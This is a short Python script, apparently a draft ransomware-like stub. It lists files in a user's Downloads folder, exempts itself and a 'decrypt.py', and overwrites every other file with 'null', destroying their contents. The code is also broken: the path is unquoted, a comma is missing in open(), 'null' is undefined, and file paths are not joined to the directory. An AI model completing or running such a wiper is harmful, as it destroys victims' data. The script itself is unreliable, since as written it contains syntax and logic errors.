import os
files = []
for file in os.listdir(/home/user/Downloads):
        if file == "voldimrt.py" or file == "decrypt.py":
                continue
        if os.path.isfile(file):
                files.append(file)
print(files)
for file in files:
        with open(file "wb") as thefile:
                thefile.write(null)
